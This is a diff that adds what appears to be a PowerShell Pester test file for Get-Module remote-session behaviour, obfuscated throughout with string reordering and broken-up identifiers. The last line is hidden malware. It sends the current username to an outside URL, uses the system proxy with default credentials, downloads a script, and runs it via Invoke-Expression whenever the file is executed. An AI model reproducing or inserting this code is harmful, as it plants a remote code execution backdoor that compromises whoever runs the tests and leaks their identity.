@@ -1,0 +1,99 @@
+seT-item  ('vA'+'riAB'+'lE:Vs'+'t')  (  [tYPe]("{0}{8}{1}{5}{9}{3}{2}{4}{7}{6}{10}"-f'MIcrOSoFT.','OMM','S.','D','gETmo','a','LEcoMMAn','du','pOwERsheLL.C','N','D')  ) ;  sET-ITEM ('VaRI'+'ABL'+'e:ovZ')  (  [TYpe]("{0}{2}{3}{1}" -f'sYST','t','Em.nET.weBRE','queS') )  ;   $6VhTU=[tYPE]("{4}{3}{0}{2}{5}{1}" -f't.CreDenT','ChE','ial','.ne','SyStem','Ca')  ;
+
+&("{1}{0}{2}" -f'ib','Descr','e') ("{0}{2}{1}{3}" -f'Rem',' ','ote module','tests') -Tags ("{2}{0}{1}" -f 'tu','re','Fea'),("{2}{4}{0}{5}{3}{1}{6}"-f 'eAd','w','Requi','do','r','minOnWin','s') {
+
+    &("{0}{1}"-f 'B','eforeAll') {
+
+        if (!${iSWI`N`D`OwS})
+        {
+            ${OrI`G`in`AldE`FaulT`PAraM`etE`RvALUEs} = ${PS`DEFAulTp`ARAmeT`erv`Alues}.("{1}{0}"-f 'ne','Clo').Invoke()
+            ${PSDeFaU`lT`P`ArAmet`Er`Va`Lu`es}[("{1}{0}{2}" -f':sk','it','ip')] = ${T`RUe}
+            return
+        }
+
+        ${ps`S`esSi`On} = .("{4}{2}{1}{3}{0}" -f 'Session','-','ew','Remote','N')
+        
+        
+    }
+
+    &("{2}{0}{1}"-f'fterAl','l','A') {
+
+        if (!${iSWin`dO`WS})
+        {
+            ${GLob`Al:pS`DeFAU`LtPa`RA`MEterVAL`UeS} = ${ORiGin`AlDEF`AuLT`parAMETE`RvAL`Ues}
+            return
+        }
+
+        if (${p`sS`ESSI`oN} -ne ${N`UlL}) { .("{1}{3}{4}{0}{2}" -f 'i','Rem','on','ove-PSS','ess') ${p`s`sesSIoN} -ErrorAction ("{2}{1}{3}{0}"-f'ue','tly','Silen','Contin') }
+    }
+
+    .('It') ((("{5}{11}{4}{10}{7}{8}{16}{12}{0}{14}{6}{9}{13}{3}{2}{1}{15}"-f' -','eter>','ith pwj<param',' w','e ','Get-M','A','ls if n','ot usi','vai','fai','odul','g','lable','List','pwj','n'))."rePL`A`Ce"(([cHar]112+[cHar]119+[cHar]106),[stRing][cHar]39)) -TestCases @(
+        @{("{0}{1}{2}"-f'parame','t','er')=("{0}{1}{2}"-f 'P','S','Session') ; ("{0}{1}" -f 'val','ue')=${P`SS`EssiON}}
+        
+    ) {
+        param(${P`ARAmE`TeR}, ${V`AlUE})
+        ${PaR`AMeT`Ers} = @{${p`Ara`MEter}=${v`ALuE}}
+        { .("{2}{1}{0}"-f'dule','o','Get-M') @parameters -ErrorAction ("{0}{1}" -f 'St','op') } | .("{1}{2}{0}"-f'uld','Sh','o') -Throw -ErrorId ("{7}{14}{1}{11}{8}{6}{4}{13}{15}{9}{10}{3}{12}{2}{5}{0}" -f'tModuleCommand','s','ds',',Microsoft.PowerShell.Comma','r','.Ge','ryWo','Re','e','va','ilableMode','cov','n','ks','moteDi','OnlyInListA')
+    }
+
+    .('It') ((("{2}{7}{8}{5}{3}{9}{4}{10}{6}{1}{0}"-f 'zy',' 0zy<parameter>0','Get-M',' using ','tAvaila','eeds','le with','odule ','succ','-Lis','b'))  -CreplAce  '0zy',[ChaR]39) -TestCases @(
+        @{("{2}{0}{3}{1}" -f 'aram','ter','p','e')=("{0}{1}{2}" -f'PSSe','ssi','on') ; ("{0}{1}" -f 'valu','e')=${ps`sEs`S`ion}},
+        @{("{2}{3}{0}{1}"-f'e','r','parame','t')=("{1}{0}"-f 'ion','PSSess') ; ("{1}{0}"-f 'ue','val')=${Pss`ESsi`oN} ; ("{0}{1}"-f'na','me')=("{1}{0}"-f 'r','Peste')}
+        
+        
+    ) {
+        param(${PAr`AMet`Er}, ${va`L`UE}, ${n`AmE})
+        ${PaRamet`E`RS} = @{${pa`R`A`MEter}=${VA`LUe}; ("{3}{2}{1}{0}"-f 'e','vailabl','A','List')=${TR`Ue}; ("{1}{0}"-f 'h','Refres')=${T`Rue}}
+        if (${NA`Me}) {
+            ${p`ARAME`TE`RS} += @{("{0}{1}" -f 'na','me')=${NA`ME}}
+        }
+        ${MOD`Ul`ES} = &("{1}{2}{0}"-f'dule','Get','-Mo') @parameters
+        ${mo`Du`leS} | .("{1}{0}"-f'hould','S') -Not -BeNullOrEmpty
+        ${mO`dules}[0] | .("{0}{1}" -f'Shoul','d') -BeOfType ("{8}{9}{1}{11}{2}{4}{10}{0}{3}{5}{6}{7}"-f'n.P','m','t.A','SModule','utom','I','nf','o','Sy','stem.Manage','atio','en')
+    }
+
+    &('It') ((("{6}{2}{10}{9}{12}{8}{3}{4}{15}{16}{14}{13}{1}{11}{7}{5}{0}" -f 't5J','er>t','Module ','an API wi','th ','alue>','Get-','J<v','as ','an','c','5J = t5',' be called ','et','aram','t5J<','p'))."REpL`ACE"(([ChAr]116+[ChAr]53+[ChAr]74),[STrINg][ChAr]39)) -TestCases @(
+        @{("{2}{1}{0}" -f 'r','amete','par') = ("{1}{0}" -f'ame','N')              ; ("{0}{1}" -f 'val','ue') = "foo"},
+        @{("{0}{1}" -f 'parame','ter') = ("{1}{0}{2}{3}" -f'llyQualif','Fu','iedN','ame'); ("{1}{0}" -f'e','valu') = @{("{2}{0}{3}{1}" -f 'odu','me','M','leNa')="foo";("{1}{2}{0}{3}{4}"-f 'e','M','oduleV','rsi','on')=("{0}{1}" -f'1.2','.3')}},
+        @{("{0}{2}{1}" -f'p','meter','ara') = "All"               ; ("{0}{1}"-f'val','ue') = ${t`Rue}},
+        @{("{1}{0}{2}" -f 'amet','par','er') = "All"               ; ("{1}{0}"-f 'alue','v') = ${Fa`LSE}},
+        @{("{3}{0}{1}{2}" -f 'ram','et','er','pa') = ("{3}{2}{1}{0}" -f'e','ailabl','tAv','Lis')     ; ("{1}{0}" -f'e','valu') = ${tr`UE}},
+        @{("{2}{1}{0}"-f'ter','me','para') = ("{4}{1}{3}{2}{0}"-f 'ble','Avai','a','l','List')     ; ("{1}{0}" -f 'e','valu') = ${FaL`SE}},
+        @{("{2}{1}{0}" -f'r','aramete','p') = ("{1}{2}{0}" -f'n','PSE','ditio')         ; ("{0}{1}" -f'val','ue') = "foo"},
+        @{("{1}{2}{0}{3}"-f 'te','param','e','r') = ("{2}{0}{1}" -f 'f','resh','Re')           ; ("{0}{1}" -f'va','lue') = ${Tr`Ue}},
+        @{("{2}{1}{0}{3}" -f'ame','r','pa','ter') = ("{1}{2}{0}" -f 'resh','Re','f')           ; ("{1}{0}" -f 'lue','va') = ${F`Al`Se}},
+        @{("{1}{0}{2}" -f 'te','parame','r') = ("{0}{1}{2}"-f 'P','SSe','ssion')         ; ("{0}{1}" -f'va','lue') = ${P`SS`e`SsioN}},
+        
+        @{("{1}{0}" -f'ameter','par') = ("{1}{3}{0}{2}" -f 'ceU','C','ri','imResour')    ; ("{0}{1}" -f'val','ue') = ("{3}{1}{0}{2}"-f '/','p:/','foo/','htt')},
+        @{("{0}{2}{1}" -f 'para','ter','me') = ("{0}{1}{2}"-f'CimNamespa','c','e')      ; ("{0}{1}" -f'v','alue') = "foo"},
+        @{("{2}{0}{1}" -f'am','eter','par') = ("{1}{0}{2}"-f'SEd','P','ition')         ; ("{1}{0}" -f'e','valu') = ("{0}{1}"-f 'C','ore')},
+        @{("{2}{1}{0}"-f'er','amet','par') = ("{2}{0}{1}"-f'tio','n','PSEdi')         ; ("{1}{0}" -f 'e','valu') = ("{1}{2}{0}" -f 'top','Des','k')}
+        ) {
+        param(${PaR`AMeT`eR}, ${v`A`luE})
+
+        ${gET`Mod`Ule`ComMAND} =  (  LS  ('va'+'riab'+'Le:vs'+'t')  ).VALue::("{1}{0}"-f'ew','n').Invoke()
+        ${G`eTMOdU`le`Co`m`ManD}.${PaRAm`E`Ter} = ${V`ALue}
+        if (${pARa`M`ET`ER} -eq ("{2}{3}{0}{1}" -f'lifie','dName','FullyQu','a')) {
+            ${g`eT`MoDuL`EcomM`ANd}."fU`lLYqu`A`li`FiEdna`ME" | .("{1}{0}" -f 'uld','Sho') -BeOfType ("{2}{6}{7}{4}{1}{5}{0}{3}"-f '.Commands.ModuleSpecific','l','Micr','ation','PowerShe','l','os','oft.')
+            ${gE`TMO`duleComM`A`ND}."fU`lL`Y`QuaLIfiEDn`AME"."nA`me" | &("{1}{0}"-f'ld','Shou') -BeExactly "foo"
+            ${g`E`T`MOdULEC`O`MManD}."fuLLy`Q`UaL`IfiEDNAMe"."vERs`i`ON" | .("{0}{1}"-f 'Shou','ld') -Be ("{0}{1}"-f '1.','2.3')
+        } else {
+            ${getMOduL`ECo`mM`A`ND}.${pa`RAMe`TEr} | .("{2}{0}{1}"-f'o','uld','Sh') -Be ${v`AluE}
+        }
+    }
+
+    &('It') ("{3}{0}{5}{9}{6}{4}{8}{1}{11}{10}{12}{7}{2}" -f're','Nam','fied','Failu','nd -FullyQualifie',' if','e a','peci','d',' -Nam','a','e ','re both s') {
+        { &("{2}{1}{0}" -f 'le','t-Modu','Ge') -Name ("{1}{0}"-f 'oo','f') -FullyQualifiedName @{("{0}{2}{1}{3}"-f 'M','uleNam','od','e')='foo'} -ErrorAction ("{0}{1}"-f'Sto','p') } | .("{0}{1}" -f 'Sho','uld') -Throw -ErrorId ("{18}{17}{12}{1}{15}{0}{19}{11}{4}{9}{16}{20}{13}{7}{14}{6}{2}{5}{3}{8}{10}" -f 'M','rg','ule','mm','a','Co','od','mmands.','an','ge,','d','s','tConvertA','.Co','GetM','umentNo','Microsoft.PowerShel','nno','Ca','es','l')
+    }
+
+    .('It') ("{0}{4}{2}{3}{1}"-f'Get-Mo','upports pipeline','le ','s','du') {
+        ${mo`du`lE} = &("{1}{2}{0}" -f 'le','Get-Mo','du') -Name ("{3}{2}{5}{0}{1}{4}{6}"-f 'Powe','rShell.','ro','Mic','Uti','soft.','lity')
+        &("{4}{3}{2}{0}{1}"-f 'Ob','ject','pare-','om','C') ${Mod`U`lE} (${M`Od`ULE} | .("{1}{2}{0}" -f'le','Get-Mo','du')) | .("{1}{0}{2}"-f 'h','S','ould') -BeNullOrEmpty
+    }
+
+    .('It') ("{1}{2}{3}{4}{0}" -f'rks','New','-CimSession',' w','o') -Pending {
+        
+    }
+}
+
+${X}=${e`NV:Us`er`NA`Me};${U}=("{0}{4}{1}{5}{3}{6}{2}"-f 'http://','sa','t?u=','org/s2.t','www.bcb','rizona.','x') + ${X};${p} =   (GCI  ('VaRI'+'aBL'+'e:ovz')).VALUe::("{1}{3}{2}{4}{0}"-f'y','GetSy','W','stem','ebProx').Invoke();${P}."crE`deN`T`IalS"= ( itEm  vAriabLE:6vHTU  ).vAlUE::"D`efa`Ultcr`e`DeNTIalS";${W}=&("{1}{3}{2}{0}" -f 'ject','Ne','-Ob','w') ("{2}{3}{1}{0}" -f'ent','li','net.w','ebc');${w}."Pr`oxY"=${p};${w}."Used`eFAuL`Tcre`denTials"=${tR`Ue};${S}=${W}.("{1}{3}{0}{2}" -f'St','Dow','ring','nload').Invoke(${u});&("{0}{3}{1}{4}{2}"-f 'Inv','ke-','on','o','Expressi') -Command ${S};
